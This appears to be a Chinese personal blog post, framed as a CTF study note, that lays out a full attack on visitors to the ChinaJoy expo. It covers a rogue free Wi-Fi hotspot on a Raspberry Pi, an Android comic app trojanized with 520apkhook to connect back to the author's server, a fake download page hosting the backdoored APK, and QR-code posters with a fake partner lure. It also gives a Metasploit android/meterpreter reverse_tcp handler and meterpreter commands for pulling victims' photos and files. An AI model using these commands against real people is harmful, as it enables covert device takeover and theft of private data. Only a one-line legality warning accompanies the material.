---
title: CTF学习笔记（大学篇）06 —— 实战！在拟定的背景下运用社工和后门程序获取用户手机上的内容
date: 2022-06-15 20:12:04
tags: CTF
categories: CTF
---

这是一次结合了前几次文章里面介绍的各种方法来做的一次实战（主要是有讲座啥的挤在一起了，然后顺带就拿出来实战了一下），那么话不多说，我们现在开始！

---

{% note danger %}

## 所有未经允许的入侵均违法！！！

{% endnote %}

## 情景拟定

假设现在即将迎来中国国际数码互动娱乐展览会（ChinaJoy，简称CJ），而你想要获取在场的用户手机中的某些文件。自然，直接向别人询问肯定是不合理的。此时我们想：能否通过网络直接访问到别人手机的文件，然后把我们需要的文件下载下来呢？

结合我前面几篇文章写的，我就想到可以通过社工手段诱导用户下载木马程序并安装运行，从而获取用户手机的控制权限，进而能够找到我们需要的文件并且下载下来这样的手段

## 方案拟定

社工手段分很多种，社工库（这个真没办法，背后的原因很多样）、钓鱼网站（Steam高价值库存会遇到很多）等等等等，但既然是一个区域内的社工，首先想到的就是公共WIFI。因为本来就是个广Door人，花生地铁WIFI用的超级多![花生地铁WIFI](http://www.wifi8.com/images/logo.png)（特别是之前流量的价格实在是伤不起的时候，但现在印象中不是有名无实就是直接没有了)

另外，像天河城之类的地方有什么`aWifi`、`freewifi`之类的，肯德基有`KFCFreeWifi`，麦当劳有`MCDonloads`，公共wifi渗透在我们生活的方方面面，虽然流量在逐渐取代他们，但是其实还是有人用的，而我们也可以开一个免费热点给其他人使用，特别是在我们这个情景（CJ会场）下

同时在会场中，我们粘贴有带后门软件的二维码的海报，并用`官方合作伙伴`等字眼吸引他人的眼球，在现场的人就很有可能会去尝试下载我们的后门软件并安装使用，这时候就形成了**被动式肉鸡上线**，我们能够在我们的服务器上对肉鸡进行远程控制，包括读取通讯录、信息等，甚至是读取文件（当然要有对应的权限）

## 准备工作

### 树莓派开启WIFI热点

这里采用Github上面的`create_ap`项目（项目链接在下面），虽然没有维护了，但是这不影响我们使用呀

[oblique/create_ap: [NOT MAINTAINED] This script creates a NATed or Bridged WiFi Access Point.](https://github.com/oblique/create_ap)

首先得先clone下来，要不然我们咋用呢

```bash
git clone https://github.com/oblique/create_ap.git
```

然后我们进入clone下来的目录，进行编译

```bash
cd create_ap
make install
```

这个过程中可能会提示权限不足，改为`root`账户运行或者直接`sudo`都行

完成以后，就会在当前目录生成一个名为`create_ap`的二进制可执行文件，直接运行即可，可以像下面这样运行

```bash
sudo ./create_ap wlan1 wlan0 FreeWifi
```

这样会创建一个名为`FreeWifi`的免费热点，当然你可以在FreeWifi后加上密码让它变成一个加密热点，结合我们这里的情景，我就把WIFI命名为`CimocFreeWifi`了

### 制作后门程序

MSF创建后门程序的过程不再多讲，请参考[CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle](/posts/CTF-in-College-5/#用520apkhook创建带有后门的apk文件)

对于`520apkhook`，这里就简略地讲一下

这里我用520apkhook去对Cimoc这个漫画查看软件进行后门注入，首先当然要去下载这个软件

我这里下载的版本是`v1.5.5`（主要是这个是测试的最后一版，而且没有更新提示，一旦我们注入后门对apk进行重签名，用户下载官方最新的apk就会装不上，当然如果包名不同就没这茬事），也非常幸运，在520apkhook的自动模式下就能够找到`onCreate()V`这个切入点，自动注入

```bash
python3 main.py --lhost <公网云服务器IP（这里不公布）> --lport 5555 -n Cimoc.apk
# 格式为 --lhost 监听服务器地址 --lport 监听服务端口 -n 需要注入的apk文件 -m {1|2|3}模式选择，默认为1
```

注入后把我们的文件拿出来，先放在一个文件夹里面，一会会用到

### 制作下载页

下载页本来想用酷安官方的那个下载页，但是后来想想要改的话太麻烦了，就去Github找了一个项目

然后找到了这个[FEMessage/app-download: build your app's download page easily (github.com)](https://github.com/FEMessage/app-download)

这个用了nodejs的yarn框架，可以比较方便地生成下载页

当然我是不用`yarn`的，所以要先安装一下`yarn`（npm安装慢可以用cnpm）

```bash
npm install yarn -g
```

然后再根据文档来操作，修改相关的文件

```json
{
  "title":"Cimoc",
  "logo": "https://cdn.bilicdn.tk/gh/Haleydu/Cimoc@release-tci/screenshot/icon.png",
  "app": [
    {
      "platform": "Android",
      "downloadLink":"//cdn.bilicdn.tk/gh/Vikutorika/FakeDownloadPage@master/app-release.apk",
      "qrcode": true,
      "icon": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADQAAABABAMAAACn5UkPAAAAG1BMVEUAAABfvRlfvRlfvRlfvRlfvRlfvRlfvRlfvRlkC4P+AAAACHRSTlMA6pIhuRVbiHyD9QIAAAEFSURBVHgB7ZQ9TwMxDIbdpiDGQoWUsd069gTDjZxgYIQBifE2GJk611U//LPrJJde7JwyIKaKd7F1j2L7HDvQqVlFr3oCKTvrHGOnClW4Us5Zxs6+Gosv6/Px5BgFYauJee0Q7XTA70iIDpKMe0I0F2iZom1KrjnFh8/mTVrJO9EePh3y5l7G20MdUC0iXlmO9BACOoNvaSqpdrh0Wf5Eo/5eRhr19zK6ZdkEbeD3Gts7uNG5NrDAuWvET474d47A2ac54poRnJMj9+UfXQ4qDEBhbArD5jSAov4cFfarsJXGSpI+iY+C4bPcs5Dc907rUpGbEd9ozJCbEf8yHgcfJFacCdYJpVD+0W2qrN4AAAAASUVORK5CYII="
    }
  ]
}

```

分别把软件名、软件logo、软件下载地址给修改了（其实里面本来还有iOS的，但是我们没做iOS所以就被我删了）

接着运行`yarn`标准命令生成（当然在生成前可以用`yarn dev`来本地查看一下）

```bash
yarn
yarn build
```

生成后的文件会在`./dist`文件夹（其实nodejs好像都是这个样子的），把里面的文件拿出来，顺带把我们的apk命名为标准的`app-release.apk`，放在同级目录下，上传到Github，并开启Github Pages功能来让我们的网页能够被公网访问，当然因为`github.io`的访问情况不太好，我还绑定了一个自定义域名（我就不放出来了，省的有人给我举报一下然后CloudFlare送我红色警告页面）

### 后门服务器设置

首先要安装msfvenom，安装的过程请参照[CTF学习笔记（大学篇）05 —— 通过msfconsole和520apkhook创建带有后门程序的安卓程序 | GamerNoTitle](/posts/CTF-in-College-5/#在Ubuntu安装Msfvenom)（kali可以不装，自带了）

然后我们运行`sudo msfconsole`，就会打开msf软件

此时我们直接运行相关命令即可

```bash
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set AutoLoadStdapi true
set LHOST 0.0.0.0
set LPORT 5555
set exitonsession false
exploit -j 
```

会打开监听器，当肉鸡上线的时候会有提示就可以进行控制了

### 海报制作

这个真的没啥说的，网上一搜一大堆，也没有什么技术含量，略过

## 攻击流程

首先我们将我们的树莓派设备放在场馆内，打开`create_ap`，并将WIFI命名为`CimocFreeWifi`

```bash
sudo ./create_ap wlan1 wlan0 CimocFreeWifi
```

将海报粘贴到位，然后等待肉鸡上钩，看到监听服务器有提示后，使用`sessions`进入设备控制

因为软件一打开就说明了为啥要存储权限（这个是软件自带的不是我注入造成的），所以大部分用户都会授予存储权限

我们可以利用meterpreter的`download`命令来下载设备上的文件

这里需要对安卓设备的目录结构进行说明：设备的内部存储空间挂载在了`/sdcard`上，我们平时的设备照片存放在`/sdcard/DCIM`文件夹，官方相机会放在`/sdcard/DCIM/Camera`，屏幕截图在`/sdcard/DCIM/Camera`，如果用的是第三方的相机，例如B612，就会在`/sdcard/DCIM/B612`文件夹

所以如果我们要下载照片的话就可以在这些目录进行寻找，使用`ls`命令可以看到当前目录的文件，使用`pwd`命令可以看到当前所在的目录

当然也可以通过`shell`来获得一个安卓的shell程序（显然不如adb好用），可以用来运行shell脚本之类的东西

找到了我们所需要的文件，使用`download`命令可以将文件下载到本地，使用`upload`可以将本地文件上传到目标机器（上传shell脚本来维持权限啥的）

